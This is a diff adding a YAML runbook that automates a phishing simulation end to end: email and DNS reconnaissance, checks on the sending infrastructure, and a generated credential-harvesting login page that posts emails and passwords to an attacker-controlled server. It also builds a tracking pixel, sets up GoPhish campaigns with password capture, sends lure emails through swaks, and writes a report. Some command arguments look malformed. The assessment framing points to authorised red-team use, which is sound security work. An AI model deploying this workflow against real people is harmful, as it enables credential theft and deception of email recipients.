@@ -1,0 +1,200 @@
+# v2 runbook — Phishing assessment campaign
+name: "Phishing Assessment"
+description: "Plan, execute, and track a phishing simulation: target reconnaissance, email template setup, sending infrastructure, tracking, reporting"
+version: "2.0"
+
+vars:
+  campaign_name: ""
+  target_emails: ""
+  sending_domain: ""
+  phishing_server: ""
+
+steps:
+  - id: preamble
+    type: log
+    message: "Phishing assessment — {campaign_name} (case: {case_id})"
+
+  # Phase 1: Reconnaissance
+  - id: recon
+    name: "Target reconnaissance"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: email_format
+        name: "Email format discovery"
+        tool: theHarvester
+        args: ["-d", "{target}", "-b", "linkedin,google",
+               "-o", "{case_dir}/email_discovery.txt"]
+        timeout: 120
+        artifacts: ["{case_dir}/email_discovery.txt"]
+
+      - id: dns_lookup
+        name: "DNS records"
+        tool: dig
+        args: ["{sending_domain}", "ANY",
+               "-o", "{case_dir}/dns_records.txt"]
+        timeout: 30
+
+      - id: mx_records
+        name: "MX records"
+        tool: dig
+        args: ["{sending_domain}", "MX",
+               "-o", "{case_dir}/mx_records.txt"]
+        timeout: 30
+
+      - id: spf_check
+        name: "SPF record"
+        tool: dig
+        args: ["{sending_domain}", "TXT",
+               "|", "grep", "spf",
+               "-o", "{case_dir}/spf_check.txt"]
+        timeout: 30
+
+      - id: dkim_check
+        name: "DKIM record"
+        tool: dig
+        args: ["default._domainkey.{sending_domain}", "TXT",
+               "-o", "{case_dir}/dkim_check.txt"]
+        timeout: 30
+
+  # Phase 2: Infrastructure setup
+  - id: infra_setup
+    name: "Phishing infrastructure setup"
+    type: parallel
+    steps:
+      - id: smtp_check
+        name: "SMTP open relay check"
+        tool: nc
+        args: ["-zv", "{phishing_server}", "25",
+               "-o", "{case_dir}/smtp_check.txt"]
+        timeout: 30
+
+      - id: gophish_check
+        name: "GoPhish API reachability"
+        tool: curl
+        args: ["-s", "-k",
+               "https://{phishing_server}:3333/api/health/",
+               "-o", "{case_dir}/gophish_status.txt"]
+        timeout: 30
+
+      - id: ssl_cert
+        name: "SSL certificate check"
+        tool: openssl
+        args: ["s_client", "-connect",
+               "{phishing_server}:443",
+               "-servername", "{sending_domain}",
+               "-o", "{case_dir}/ssl_cert.txt"]
+        timeout: 30
+
+  # Phase 3: Email template preparation
+  - id: templates
+    name: "Email template preparation"
+    type: parallel
+    steps:
+      - id: landing_page
+        name: "Credential harvesting page template"
+        tool: python3
+        args: ["-c", "\"open('{case_dir}/landing.html','w').write('''<!DOCTYPE html><html><head><title>Login</title></head><body><form action=\\\"https://{phishing_server}/login\\\"><input name=\\\"email\\\" placeholder=\\\"Email\\\"><input type=\\\"password\\\" name=\\\"pass\\\" placeholder=\\\"Password\\\"><button>Sign In</button></form></body></html>''')\"",
+               "-o", "{case_dir}/landing.html"]
+        timeout: 30
+
+      - id: tracking_img
+        name: "Tracking pixel generator"
+        tool: python3
+        args: ["-c", "\"from base64 import b64encode; pix=open('{case_dir}/tracking_pixel.html','w'); pix.write('<img src=\\\"https://{phishing_server}/track/{campaign_name}\\\" width=\\\"1\\\" height=\\\"1\\\"/>')\"",
+               "-o", "{case_dir}/tracking_pixel.html"]
+        timeout: 30
+
+  # Phase 4: Campaign execution (GoPhish API)
+  - id: ask_gophish
+    type: prompt
+    message: "Create and send GoPhish campaign? (requires GoPhish API key)"
+    then:
+      - id: gophish_campaign
+        name: "Create GoPhish campaign"
+        type: parallel
+        steps:
+          - id: create_group
+            name: "Create target group"
+            tool: curl
+            args: ["-s", "-k", "-X", "POST",
+                   "https://{phishing_server}:3333/api/groups/",
+                   "-H", "Authorization: {gophish_api_key}",
+                   "-H", "Content-Type: application/json",
+                   "-d", "'{{\"name\":\"{campaign_name}\",\"targets\":{{\"email\":\"{target_emails}\"}}}}'",
+                   "-o", "{case_dir}/gophish_group.json"]
+            timeout: 30
+
+          - id: create_template
+            name: "Create email template"
+            tool: curl
+            args: ["-s", "-k", "-X", "POST",
+                   "https://{phishing_server}:3333/api/templates/",
+                   "-H", "Authorization: {gophish_api_key}",
+                   "-H", "Content-Type: application/json",
+                   "-d", "'{{\"name\":\"{campaign_name}\",\"subject\":\"Security Alert\",\"text\":\"Please verify your account\",\"html\":\"<html><body><p>Click here: {{.URL}}</p></body></html>\"}}'",
+                   "-o", "{case_dir}/gophish_template.json"]
+            timeout: 30
+
+          - id: create_page
+            name: "Create landing page"
+            tool: curl
+            args: ["-s", "-k", "-X", "POST",
+                   "https://{phishing_server}:3333/api/pages/",
+                   "-H", "Authorization: {gophish_api_key}",
+                   "-H", "Content-Type: application/json",
+                   "-d", "'{{\"name\":\"{campaign_name}\",\"html\":\"{case_dir}/landing.html\",\"capture_credentials\":true,\"capture_passwords\":true}}'",
+                   "-o", "{case_dir}/gophish_page.json"]
+            timeout: 30
+
+  # Phase 5: SMTP relay test
+  - id: ask_send_test
+    type: prompt
+    message: "Send test email manually?"
+    then:
+      - id: send_test
+        name: "Send SMTP test email"
+        tool: swaks
+        args: ["--to", "{target_emails}",
+               "--from", "noreply@{sending_domain}",
+               "--header", "Subject: Security Alert",
+               "--body", "Please verify your account: https://{phishing_server}/login",
+               "--server", "{phishing_server}",
+               "-o", "{case_dir}/smtp_test.log"]
+        timeout: 60
+        artifacts: ["{case_dir}/smtp_test.log"]
+
+  # Phase 6: Results tracking
+  - id: tracking
+    name: "Campaign results"
+    type: parallel
+    steps:
+      - id: gophish_results
+        name: "Fetch GoPhish campaign results"
+        tool: curl
+        args: ["-s", "-k",
+               "https://{phishing_server}:3333/api/campaigns/",
+               "-H", "Authorization: {gophish_api_key}",
+               "-o", "{case_dir}/campaign_results.json"]
+        timeout: 30
+
+  # Phase 7: Report
+  - id: report
+    name: "Generate phishing assessment report"
+    type: report
+    format: markdown
+    title: "Phishing Assessment — {campaign_name}"
+    output: "{case_dir}/phishing-report.md"
+    sections:
+      - heading: "Campaign Overview"
+        body: "- Name: {campaign_name}\n- Target: {target_emails}\n- Domain: {sending_domain}\n- Server: {phishing_server}"
+      - heading: "Infrastructure"
+        body: "- SPF/DKIM: {case_dir}/spf_check.txt\n- SMTP relay: {case_dir}/smtp_check.txt\n- SSL cert: {case_dir}/ssl_cert.txt"
+      - heading: "Results"
+        body: "- Campaign data: {case_dir}/campaign_results.json\n- Landing page: {case_dir}/landing.html"
+
+postflight:
+  - id: done
+    type: notify
+    level: success
+    message: "Phishing assessment complete — {case_dir}"
